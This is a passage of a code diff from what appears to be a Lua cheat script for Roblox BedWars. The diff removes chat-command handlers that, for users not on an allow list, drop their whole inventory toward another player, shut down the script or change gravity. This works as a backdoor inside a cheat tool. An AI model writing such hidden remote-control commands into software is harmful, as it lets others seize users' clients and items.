-		if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then
-			GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false);
-			task.wait(1);
-		end
-		for i, v in pairs(bedwarsStore.localInventory.inventory.items) do
-			local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({item=v.tool,amount=(((v.amount ~= math.huge) and v.amount) or 99999999)});
-			if e then
-				e.CFrame = plr.Character.HumanoidRootPart.CFrame;
-			else
-				v.tool:Destroy();
-			end
-		end
-	end
-end,[";uninject default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		GuiLibrary.SelfDestruct();
-	end
-end,[";gravity default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		workspace.Gravity = tonumber(args[1]) or 192.6;
-	end
-end};
-
+}
 
 function isPlayerAllowed()
 	return false
